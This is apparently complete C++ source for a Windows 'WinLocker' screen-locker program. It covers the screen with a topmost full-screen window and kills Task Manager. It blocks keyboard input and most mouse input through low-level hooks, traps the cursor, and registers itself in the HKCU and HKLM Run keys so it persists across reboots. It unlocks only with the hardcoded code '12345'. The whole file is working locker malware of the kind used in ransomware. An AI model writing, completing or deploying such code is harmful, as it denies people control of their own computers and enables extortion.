#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <string.h>
#include <string>

#define OFFSETX 300
#define OFFSETY 300

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam);
void killProcessByName(const char *filename);
void appendEditText(HWND hWnd, const char* toAdd);
void createLogFont();
void unlockWindows();
void createAutorun();
void deleteAutorun();
void confineCursor(HWND hwnd);

const char ClassName[] = "WinLocker";
const char Title[] = "Windows Locked";
HHOOK hHookWindows;
HHOOK hhHookWindows;
HWND tEdit;
HWND IndexWindow;
std::string unlock = "12345";
std::string inpt = "";

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR cmdline, int cmdshow) {
    WNDCLASS wc = { };
    static MSG msg;

    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = ClassName; 
    wc.hbrBackground = (HBRUSH) GetStockObject(WHITE_BRUSH);
    RegisterClass(&wc);

    HDC hDCScreen = GetDC(NULL);
    int width = GetDeviceCaps(hDCScreen, HORZRES);
    int height = GetDeviceCaps(hDCScreen, VERTRES);
    ReleaseDC(NULL, hDCScreen);

    IndexWindow = CreateWindowEx(
        0,
        ClassName,
        Title,
        WS_OVERLAPPEDWINDOW & ~WS_CAPTION & ~WS_THICKFRAME & WS_VISIBLE & WS_POPUP & SWP_NOMOVE,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        width,
        height,
        HWND_DESKTOP,
        0,
        hInst,
        NULL);

    tEdit = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        "edit",
        "", WS_CHILD | WS_VISIBLE | ES_LEFT, 
        100 + OFFSETX, 
        30 + OFFSETY, 
        1000, 
        100, 
        IndexWindow, 
        (HMENU)1000, 
        hInst, 
        NULL);

    createLogFont();
    killProcessByName("Taskmgr.exe");
    killProcessByName("taskmgr.exe");
    hHookWindows = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)&KeyboardProc, GetModuleHandle(NULL), 0);
    hhHookWindows = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)&MouseProc, GetModuleHandle(NULL), 0);
    SetWindowPos(IndexWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    confineCursor(IndexWindow);
    UpdateWindow(IndexWindow);
    ShowWindow(IndexWindow, SW_SHOWMAXIMIZED);

    while (GetMessage(&msg, 0, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_DESTROY: {
            PostQuitMessage(0);
            break;
        }

        case WM_NCHITTEST: {
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }

        case WM_SYSCOMMAND: {
            if (wParam == (SC_MOVE + 2))
                return 1;
            break;
        }

        case WM_CREATE: {
            CreateWindowA("BUTTON", "UNLOCK", WS_CHILD | WS_VISIBLE, 100 + OFFSETX, 350 + OFFSETY, 1000, 100, hwnd, (HMENU)100, NULL, NULL);
            for (int i = 0; i < 10; i++) {
                char buf[10];
                _itoa(i, buf, 10);
                LPCSTR name = buf;
                CreateWindowA("BUTTON", name, WS_CHILD | WS_VISIBLE, i * 100 + 100 + OFFSETX, 200 + OFFSETY, 100, 100, hwnd, (HMENU)i, NULL, NULL);
            }
            CreateWindowA("BUTTON", "CLEAR", WS_CHILD | WS_VISIBLE, 1150 + OFFSETX, 30 + OFFSETY, 100, 100, hwnd, (HMENU)10, NULL, NULL);
            createAutorun();
            break;
        }

        case WM_COMMAND: {
            if (wParam == 100) {
                if (inpt == unlock) {
                    unlockWindows();
                } else {
                    SetWindowText(tEdit, "No");
                }
            }

            if (wParam == 101) {
                unlockWindows();
            }

            if (wParam >= 0 && wParam <= 9) {
                char buf[10];
                _itoa((int)wParam, buf, 10);
                inpt += std::to_string(wParam);
                appendEditText(tEdit, buf);
            }

            if (wParam == 10) {
                inpt = "";
                SetWindowText(tEdit, "");
            }

            break;
        }
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void killProcessByName(const char *filename) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes) {
        if (strcmp(pEntry.szExeFile, filename) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    return -1;
}

LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam) {
    if (wParam == WM_LBUTTONDOWN || wParam == WM_LBUTTONUP || wParam == WM_MOUSEMOVE) {
        return CallNextHookEx(hhHookWindows, code, wParam, lParam);
    } else {
        return -1;
    }
}

void appendEditText(HWND hWnd, const char* toAdd) {
    int iLength = GetWindowTextLength(hWnd);
    SendMessage(hWnd, EM_SETSEL, iLength, iLength);
    SendMessage(hWnd, EM_REPLACESEL, 0, (LPARAM)toAdd);
    SendMessage(hWnd, WM_VSCROLL, SB_BOTTOM, (LPARAM)NULL);
}

void createLogFont() {
    LOGFONT lf = { 0 };
    lf.lfCharSet = DEFAULT_CHARSET;
    strcpy_s(lf.lfFaceName, LF_FACESIZE, "Arial");
    lf.lfWeight = FW_NORMAL;
    lf.lfHeight = 70;
    HFONT hFont = CreateFontIndirect(&lf);
    SendMessage(tEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
}

void unlockWindows() {
    SetWindowText(tEdit, "Unlocked");
    UnhookWindowsHookEx(hHookWindows);
    UnhookWindowsHookEx(hhHookWindows);
    deleteAutorun();
    ClipCursor(NULL); // Снимаем ограничение с курсора
    DestroyWindow(IndexWindow);
}

void createAutorun() {
    char path[255];
    GetModuleFileName(NULL, path, 255);
    DWORD dwBufsize = sizeof(path);
    HKEY hKeys;
    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
        RegSetValueEx(hKeys, "test", 0, REG_SZ, reinterpret_cast<const BYTE*>(path), sizeof(path));
        RegCloseKey(hKeys);
    }
    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
        RegSetValueEx(hKeys, "test", 0, REG_SZ, reinterpret_cast<const BYTE*>(path), sizeof(path));
        RegCloseKey(hKeys);
    }
}

void deleteAutorun() {
    HKEY hKeys;
    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
        RegDeleteValue(hKeys, "test");
        RegCloseKey(hKeys);
    }
}

void confineCursor(HWND hwnd) {
    RECT rect;
    GetWindowRect(hwnd, &rect);
    ClipCursor(&rect);
}
